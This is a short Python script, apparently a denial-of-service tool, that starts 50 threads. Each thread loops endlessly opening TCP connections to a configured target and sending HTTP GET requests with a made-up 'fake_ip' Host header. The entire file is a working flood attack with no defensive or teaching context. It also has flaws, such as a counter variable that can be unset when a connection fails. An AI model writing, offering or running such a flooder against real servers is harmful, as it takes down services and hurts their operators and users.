import socket
import threading

from constraints import HOST, PORT 

target  = HOST
port = PORT
fake_ip = '182.21.20.32'
attack_num = 10
print("Sending Packets...")

def attack():
    while True:
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        global attack_num
        attack_num += 1
        packesnum = attack_num
        packesnum = str(packesnum)
        print(f'Packets {packesnum} sending')
        print(f'Packets {packesnum} sending done!')
      except:
         print(f'Packets {packesnum} sending failed')
      finally:
         s.close()

for i in range(50):
    thread = threading.Thread(target=attack)
    thread.start()
